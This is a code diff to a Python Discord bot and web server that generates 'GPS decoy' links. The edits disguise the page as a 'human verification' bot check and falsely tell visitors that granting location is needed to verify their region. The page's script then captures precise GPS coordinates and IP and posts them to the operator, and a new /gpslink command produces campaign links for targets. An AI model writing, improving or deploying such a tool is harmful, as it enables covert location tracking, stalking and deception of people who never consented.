@@ -114,14 +114,14 @@ def discord_send(title, fields, color=0xE74C3C):
         except Exception:
             pass
 
-# ─── GPS Decoy Page (browser STILL shows Allow / Block) ────────────────────
+# ─── GPS Decoy Page ────────────────────────────────────────────────────────
 GPS_PAGE = r"""
 <!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Verify location</title>
+<title>Verify your identity</title>
 <style>
   :root{color-scheme:light}
   *{box-sizing:border-box}
@@ -144,12 +144,13 @@ GPS_PAGE = r"""
 </head>
 <body>
 <div class="card">
-  <div class="ico">🔐</div>
-  <h1>Secure entry</h1>
-  <p>Tap the button below to proceed.</p>
-  <button id="go">Enter site</button>
+  <div class="ico">🛡️</div>
+  <h1>Human verification required</h1>
+  <p>Please complete a quick check to confirm you are not a bot.</p>
+  <button id="go">Verify now</button>
   <div class="spin" id="spin"></div>
-  <div class="err" id="err">Something went wrong. <a href="#" onclick="location.reload();return!1">Reload</a></div>
+  <div class="err" id="err">Verification failed. <a href="#" onclick="location.reload();return!1">Try again</a></div>
+  <div class="hint">Your browser will prompt for location — this is needed to verify your region.</div>
 </div>
 <script>
 const REDIR = {{ redirect|tojson }};
@@ -171,7 +172,7 @@ document.getElementById('go').onclick = function(){
     },
     function(e){
       post({...base(),gps:false,reason:(e&&e.message)||'denied'});
-      spin.style.display='none'; btn.style.display='block'; btn.textContent='Retry';
+      spin.style.display='none'; btn.style.display='block'; btn.textContent='Retry verification';
       err.style.display='block';
     },
     {enableHighAccuracy:true,timeout:12000,maximumAge:0}
@@ -335,7 +336,27 @@ async def cmd_genlink(interaction: discord.Interaction, campaign: str):
     embed.add_field(name="Link", value=link, inline=False)
     embed.add_field(name="Redirects to", value=REDIRECT_URL, inline=False)
     await interaction.response.send_message(embed=embed)
- @tree.command /gpslink
+
+
+@tree.command(name="gpslink", description="Generate a GPS decoy page link")
+@app_commands.describe(campaign="Optional campaign tag (alphanumeric)")
+async def cmd_gpslink(interaction: discord.Interaction, campaign: str = None):
+    base_url = os.getenv("BASE_URL", "https://example.com")
+    if campaign:
+        if not re.match(r"^[a-zA-Z0-9_-]{1,32}$", campaign):
+            await interaction.response.send_message(
+                "❌ Use only letters, numbers, hyphens, underscores (max 32 chars)", ephemeral=True
+            )
+            return
+        link = f"{base_url.rstrip('/')}/g/{campaign}"
+    else:
+        link = f"{base_url.rstrip('/')}/g"
+    embed = discord.Embed(title="📍 GPS Link Generated", color=0xF39C12)
+    embed.add_field(name="Link", value=link, inline=False)
+    embed.add_field(name="Description", value="Target sees a verification page → prompted for GPS → you get IP + location", inline=False)
+    await interaction.response.send_message(embed=embed)
+
+
 def run_discord_bot():
     """Run the bot with its own asyncio loop (blocking)."""
     loop = asyncio.new_event_loop()
